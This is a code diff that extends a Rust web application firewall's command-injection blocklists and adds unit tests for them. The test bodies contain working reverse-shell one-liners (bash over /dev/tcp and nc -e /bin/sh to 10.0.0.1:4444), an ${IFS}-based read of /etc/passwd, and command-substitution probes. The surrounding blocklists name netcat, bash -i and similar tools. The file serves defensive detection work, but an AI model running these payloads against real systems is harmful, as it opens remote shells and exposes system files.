@@ -219,6 +219,21 @@ const BALANCED_PATTERNS: &[&str] = &[
     "\nls ",
     "\nwget ",
     "\ncurl ",
+    // ── Command injection: unambiguous Unix forms (reverse shells, IFS bypass,
+    //    brace expansion, `nc`/`bash -i`). High signal, ~0 FP on real traffic. ──
+    "/dev/tcp/",
+    "bash -i",
+    "nc -e",
+    "ncat -e",
+    " -e /bin/",
+    "${ifs",
+    "$ifs",
+    "{cat,",
+    "{ls,",
+    "; nc ",
+    ";nc ",
+    "| nc ",
+    "|nc ",
     "/etc/passwd",
     "/etc/shadow",
     // ── Path Traversal ──
@@ -362,6 +377,25 @@ const AGGRESSIVE_EXTRA_PATTERNS: &[&str] = &[
     // ── Command injection: Windows tokens (FP in event-log shipping) ──
     "cmd.exe",
     "powershell",
+    "& type ",
+    // ── Command injection: Unix substitution + bare metachar+command. Broader
+    //    (`$(` also flags jQuery/shell snippets) → aggressive routes only. ──
+    "$(",
+    "`id`",
+    "`whoami",
+    "$(id",
+    "$(whoami",
+    "whoami",
+    "ping -c",
+    "; sleep ",
+    "&&sleep",
+    "&& ls",
+    "| sh",
+    "|sh ",
+    "| bash",
+    "|bash",
+    ">& /dev",
+    " -o- | ",
     // ── NoSQL ops (no delimiter — `{"id":"$gt-23"}` falsely matches) ──
     "$gt",
     "$ne",
@@ -1408,6 +1442,68 @@ mod tests {
             validate_request("POST", Some("application/json"), body, &strict_profile()),
             WafVerdict::Deny("injection pattern detected")
         );
+    }
+
+    #[test]
+    fn denies_reverse_shell_balanced() {
+        // Unambiguous Unix command-injection forms are caught in balanced too.
+        for body in [
+            br#"{"x":"; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}"#.as_slice(),
+            br#"{"x":"foo; nc -e /bin/sh 10.0.0.1 4444"}"#.as_slice(),
+            br#"{"x":"a${IFS}cat${IFS}/etc/passwd"}"#.as_slice(),
+        ] {
+            assert_eq!(
+                validate_request("POST", Some("application/json"), body, &strict_profile()),
+                WafVerdict::Deny("injection pattern detected"),
+                "missed: {}",
+                String::from_utf8_lossy(body)
+            );
+        }
+    }
+
+    #[test]
+    fn denies_cmdi_substitution_aggressive() {
+        // Command substitution + bare metachar+command (FP-prone → aggressive).
+        for body in [
+            br#"{"x":"$(id)"}"#.as_slice(),
+            br#"{"x":"ls | whoami"}"#.as_slice(),
+            br#"{"x":"x && ls -la /"}"#.as_slice(),
+        ] {
+            assert_eq!(
+                validate_request(
+                    "POST",
+                    Some("application/json"),
+                    body,
+                    &aggressive_profile()
+                ),
+                WafVerdict::Deny("injection pattern detected"),
+                "missed: {}",
+                String::from_utf8_lossy(body)
+            );
+        }
+    }
+
+    #[test]
+    fn allows_benign_shell_like_text() {
+        // Precision guard: legit prose/code that *looks* shell-ish must pass —
+        // a regression here is a false positive (the corpus's hard fail).
+        for body in [
+            br#"{"note":"let x = a && b || c;"}"#.as_slice(),
+            br#"{"name":"O'Brien & D'Angelo Sons, Inc."}"#.as_slice(),
+            br#"{"q":"the union of designers and engineers"}"#.as_slice(),
+        ] {
+            assert_eq!(
+                validate_request(
+                    "POST",
+                    Some("application/json"),
+                    body,
+                    &aggressive_profile()
+                ),
+                WafVerdict::Allow,
+                "false positive: {}",
+                String::from_utf8_lossy(body)
+            );
+        }
     }
 
     #[test]
